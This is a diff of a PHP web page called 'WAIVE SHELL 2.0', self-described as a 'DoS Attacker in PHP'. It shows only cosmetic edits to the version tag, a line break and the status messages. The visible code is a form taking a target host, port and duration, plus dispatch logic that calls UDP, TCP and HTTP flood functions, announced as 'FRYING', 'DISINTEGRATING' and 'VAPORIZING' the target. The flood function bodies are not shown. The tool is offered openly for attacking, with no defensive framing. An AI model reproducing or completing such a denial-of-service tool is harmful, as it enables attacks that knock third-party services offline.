@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="WaiveShell2.0" content="DoS Attacker in PHP">
+    <meta name="WaiveShell1.0" content="DoS Attacker in PHP">
     <meta name="author" content="waived">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>WAIVE SHELL 2.0</title>
@@ -49,7 +49,7 @@
         <label for="time"><b>SECONDS</b></label><br>
         <input type="number" name="time" id="time" required placeholder="300"><br><br>
         <button type="submit">Launch</button>
-    </form>
+    </form><br>
     <?php
     function _udp($ip, $port, $time) {
         $start_time = microtime(true);
@@ -119,13 +119,13 @@
         $ip = gethostbyname($host);
         
         if (strtolower($type) === 'udp') {
-            echo "\r\nFRYING " . $ip . ":" . $port . " VIA UDP FOR " . $time . " SECONDS";
+            echo "FRYING " . $ip . ":" . $port . " VIA UDP FOR " . $time . " SECONDS";
             _udp($ip, $port, $time);
         } elseif (strtolower($type) === 'tcp') {
-            echo "\r\nDISINTEGRATING " . $ip . ":" . $port . " VIA TCP FOR " . $time . " SECONDS";
+            echo "DISINTEGRATING " . $ip . ":" . $port . " VIA TCP FOR " . $time . " SECONDS";
             _tcp($ip, $port, $time);
         } elseif (strtolower($type) === 'http') {
-            echo "\r\nVAPORIZING " . $host . " VIA HTTP FOR " . $time . " SECONDS";
+            echo "VAPORIZING " . $host . " VIA HTTP FOR " . $time . " SECONDS";
             _http($ip, $host, $port, $time);
         } else {
             // idk bruh
